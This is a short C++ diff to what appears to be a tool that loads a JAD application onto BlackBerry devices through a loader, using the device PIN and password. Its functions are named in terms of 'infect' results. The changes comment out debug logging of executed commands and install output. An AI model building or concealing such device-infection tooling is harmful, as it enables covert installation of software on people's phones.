@@ -150,10 +150,8 @@ wstring exec(wstring cmd, wstring args) {
 
 	SetCurrentDirectoryW(ExePath().c_str());
 	wstring full_path=cmd + L" " + args;
-	//wstring full_path = L"\"" + ExePath() + L"\\" + cmd + L"\" " + args;
-	//full_path = Replace(full_path,L"\\",L"\\\\");
-	//full_path = Replace(full_path,L" ",L"\\ ");
-	debug << L"EXECUTING: " << full_path << endl;
+
+	//debug << L"EXECUTING: " << full_path << endl;
 	FILE* pipe = _wpopen(full_path.c_str(), L"r");
 	if (!pipe) {
 		debug<<"Exe not found"<<endl;
@@ -172,13 +170,13 @@ wstring exec(wstring cmd, wstring args) {
 
 	if(result.find(INTERRUPT_PASSWORD)!=wstring::npos){
 		_pclose(pipe);
-		debug<<result<<endl;
+		//debug<<result<<endl;
 		return L"PASSWORD";
 	}
 
 	if(result.find(INTERRUPT_ERROR)!=wstring::npos){
 		_pclose(pipe);
-		debug<<result<<endl;
+		//debug<<result<<endl;
 		return L"ERROR";
 	}
 
@@ -258,7 +256,7 @@ boolean GetBBVersion(wstring pin,  wstring password, int* version)
 infect_result loadJad(wstring pin, wstring password, wstring jadname){
 	wstring instresult=execJloader(pin, password, L"load " + jadname);
 
-	debug << instresult<< endl;
+	//debug << instresult<< endl;
 	if(int error = isError(instresult)){
 		debug<< "loadJad error: "<<error<< endl;
 		return ERR_LOAD;
